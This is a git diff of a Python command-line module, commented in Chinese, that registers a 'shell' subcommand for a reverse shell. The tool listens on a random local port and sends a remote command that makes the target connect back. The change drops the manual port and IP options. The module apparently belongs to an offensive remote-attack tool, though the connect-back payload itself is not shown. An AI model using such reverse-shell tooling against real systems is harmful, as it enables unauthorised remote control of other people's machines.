@@ -12,35 +12,28 @@ from app.system.net.targets import get_ip
 
 
 def register(commands, defaults):
-    """注册功能子命令并沿用统一参数默认值。"""
-    shell = commands.add_parser("shell", help="反弹终端：本机监听并让目标连回来")
+    """注册功能子命令并沿用统一参数默认值。
+
+    目标与 UDP 端口沿用远程攻击分组的共用参数；本机地址与监听端口由程序
+    自动选择，不再提供单独开关。
+    """
+    shell = commands.add_parser(
+        "shell",
+        help="反弹终端：本机监听并让目标连回来",
+        description="在本机随机空闲端口监听，通过远程命令让目标连回来，"
+        "再把当前终端接到这条会话上。本机地址按目标地址自动挑选。",
+    )
     shell.set_defaults(**dict(defaults))
     add_target(shell)
     add_port(shell)
     shell.set_defaults(shell=True)
-    shell.add_argument(
-        "--shell-port",
-        type=int,
-        default=0,
-        metavar="PORT",
-        help="本机监听端口，默认 0 表示随机",
-    )
-    shell.add_argument(
-        "--shell-ip",
-        type=str,
-        default="",
-        metavar="IP",
-        help="写进目标连接命令的本机地址，默认自动探测",
-    )
 
 
 def run_shell(arguments):
     """启动反弹终端：本机监听、下发连接命令，并把本机终端接到会话上。"""
     log = cli_log.LOG
     host = get_ip(arguments.ip)[0]
-    server = ShellServer(
-        port=arguments.shell_port, local_ip=arguments.shell_ip or None, target=host
-    )
+    server = ShellServer(port=0, local_ip=None, target=host)
     server.start()
     try:
         print(
